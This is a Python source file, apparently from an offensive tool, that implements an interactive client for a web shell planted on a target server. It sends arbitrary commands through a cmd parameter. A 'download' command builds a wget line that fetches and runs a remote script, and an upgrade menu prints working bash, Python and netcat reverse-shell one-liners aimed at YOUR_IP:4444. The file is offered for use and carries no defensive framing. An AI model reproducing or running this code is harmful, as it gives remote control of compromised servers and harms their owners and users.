"""Interactive web shell interface"""

class ShellInterface:
    """Interactive shell interface for uploaded web shells"""
    
    def __init__(self, request_handler, shell_url):
        self.request_handler = request_handler
        self.shell_url = shell_url
    
    def test_execution(self):
        """Test if uploaded shell is executable"""
        print(f"\n[*] Testing shell execution...")
        
        from ..config import TEST_COMMANDS
        
        for cmd in TEST_COMMANDS:
            test_url = f"{self.shell_url}?cmd={cmd}"
            
            response = self.request_handler.get(test_url, timeout=10)
            
            if response and response.status_code == 200 and len(response.text) > 0:
                print(f"    [+] Command executed: {cmd}")
                print(f"    [+] Output:\n{response.text[:500]}")
                return True
        
        print("    [-] Shell doesn't appear to be executing commands")
        return False
    
    def start_interactive(self):
        """Start interactive shell session"""
        print("\n" + "=" * 60)
        print("INTERACTIVE WEB SHELL")
        print("=" * 60)
        print(f"Shell URL: {self.shell_url}")
        print("Type 'exit' to quit, 'help' for commands")
        print("-" * 60 + "\n")
        
        while True:
            try:
                cmd = input("shell> ")
                
                if cmd.lower() == 'exit':
                    break
                elif cmd.lower() == 'help':
                    self._show_help()
                    continue
                elif cmd.lower().startswith('download '):
                    url = cmd.split(' ', 1)[1]
                    cmd = f"wget {url} -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh"
                elif cmd.lower() == 'upgrade':
                    self._show_upgrade_options()
                    continue
                
                # Execute command
                self._execute_command(cmd)
                
            except KeyboardInterrupt:
                print("\n[*] Interrupted")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
    
    def _execute_command(self, cmd):
        """Execute command on remote shell"""
        response = self.request_handler.get(f"{self.shell_url}?cmd={cmd}", timeout=30)
        
        if response and response.status_code == 200:
            output = response.text
            # Try to extract output between <pre> tags if present
            if '<pre>' in output:
                output = output.split('<pre>')[1].split('</pre>')[0]
            
            print(output)
        else:
            print(f"[-] Error: Status code {response.status_code if response else 'Connection failed'}")
    
    def _show_help(self):
        """Show available commands"""
        print("\nAvailable commands:")
        print("  exit          - Exit shell")
        print("  download URL  - Download reverse shell")
        print("  upgrade       - Upgrade to reverse shell")
        print("  Any other command will be executed on target\n")
    
    def _show_upgrade_options(self):
        """Show reverse shell upgrade options"""
        print("\n[*] Reverse shell options:")
        print("1. Bash: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1")
        print("2. Python: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
        print("3. NC: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f")
        print("\n[!] Set up listener first: nc -lvnp 4444\n")